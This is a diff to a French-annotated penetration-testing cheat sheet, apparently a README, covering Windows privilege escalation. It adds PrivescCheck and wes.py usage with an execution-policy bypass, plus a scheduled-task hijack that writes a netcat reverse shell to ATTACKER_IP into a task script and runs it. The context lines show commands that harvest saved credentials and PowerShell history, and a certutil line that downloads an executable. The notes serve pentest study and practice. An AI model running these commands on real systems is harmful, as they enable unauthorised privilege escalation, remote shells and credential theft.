@@ -28,7 +28,17 @@ _______________________________ /\
 [MISC] Bypass authentication : https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass <br>
 [MISC] PAYLOADSALLTHETHINGS : https://github.com/swisskyrepo/PayloadsAllTheThings (reverse shell, etc...) <br>
 [MISC] Binaries exploit : https://gtfobins.github.io/ <br>
-
+[MISC] PrivEscCheck (windows) : https://github.com/itm4n/PrivescCheck <br>
+```
+PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
+PS C:\> . .\PrivescCheck.ps1
+PS C:\> Invoke-PrivescCheck
+```
+[MISC] wes.py : https://github.com/bitsadmin/wesng/blob/master/wes.py <br>
+```
+user@kali$ wes.py systeminfo.txt        
+```
+[MISC] Windows Local PrivEsc : https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
 
 -------------------------------------------------------------------------------------------------------------------------------------------+
 # Basiques !
@@ -57,7 +67,6 @@ _______________________________ /\
 ```
 # Windows
 
-
 ```
 [RDP]            => xfreerdp /d:<domain> /u:'<user>' /p:'<password>' /v:<prefix>.<domain> /drive:.,kali-share +clipboard
 
@@ -66,7 +75,10 @@ _______________________________ /\
 [CMD](WIN)*PS*   => type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt (ou %userprofile% avec CMD)
 [CMD](WIN)*PS*   => cmdkey /list  #liste les creds sauvegardés
 [CMD](WIN)*PS*   => runas /savecred /user:admin cmd.exe  #exécute l'action avec les credentials sauvegardés
-[CMD](AD)*PS*    => Set-ADUser -ChangePasswordAtLogon $true -Identity <user> -Verbose
+[CMD](WIN)*PS*   => schtasks | schtasks /query /tn TASKVULNERABLE /fo list /v   #Planificateur de tâche
+                    icacls c:\tasks\schtask.bat #Donne des infos sur les permissions planificateur de tâches
+                    echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
+                    schtasks /run /tn vulntask #Exécute la tâche direct
 
 [CMD](WIN)*CMD*  => certutil.exe -urlcache -f http://<ip>:<port>/file.exe new_file.exe
 ```
